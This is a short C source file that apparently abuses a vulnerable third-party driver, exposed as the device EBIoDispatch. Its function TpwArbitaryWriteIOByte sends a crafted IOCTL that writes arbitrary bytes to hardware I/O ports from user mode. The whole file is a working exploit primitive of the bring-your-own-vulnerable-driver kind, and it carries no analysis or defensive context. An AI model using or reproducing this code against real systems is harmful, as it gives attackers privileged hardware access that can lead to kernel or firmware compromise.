#include <Ntdefs.h>
#include <Utils.h>

#define CTL_TPWSAV_OUTB         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, (FILE_READ_ACCESS | FILE_WRITE_ACCESS))

#define DEVICE_TPWSAV_NAME      L"\\\\.\\EBIoDispatch"

BOOLEAN NTAPI
TpwArbitaryWriteIOByte(
	_In_ DWORD          Port,
	_In_ DWORD          Value
) {
	HANDLE              DeviceHandle;
    DWORD               BytesReturned;

    DeviceHandle = CreateFileW(
        DEVICE_TPWSAV_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (DeviceHandle == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD Buffer[2];
    Buffer[0] = Port;
    Buffer[1] = Value;

    BOOL Result = DeviceIoControl(
        DeviceHandle,
        CTL_TPWSAV_OUTB,
        &Buffer,
        sizeof(Buffer),
        NULL,
        0,
        &BytesReturned,
        NULL
    );

    return Result;
}
